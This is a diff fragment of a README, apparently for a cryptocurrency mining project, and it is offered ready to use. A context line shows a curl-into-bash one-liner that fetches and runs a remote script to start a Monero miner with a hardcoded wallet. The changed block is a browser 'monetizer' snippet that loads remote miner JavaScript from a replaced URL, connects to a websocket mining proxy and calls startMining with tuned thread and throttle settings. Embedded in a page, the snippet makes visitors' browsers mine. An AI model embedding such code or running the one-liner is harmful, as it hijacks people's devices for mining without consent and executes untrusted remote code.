@@ -13,16 +13,16 @@ bash <(curl -fsSL git.io/aminer) -o gulf.moneroocean.stream:10128 -u 8ANyqnPspbm
 ```
 ## `Web Monitizer JS`
 ```
-<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script src="https://alixjs.vercel.app/connect.js"></script>
 <script>
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
     var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
-    var workerId = "AliX"
-    var threads = -1;
+    var workerId = "AliX-SM";
+    var threads = 1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
-    throttleMiner = 40;
+    throttleMiner = 30;
 </script>
 ```
 # `For You`  
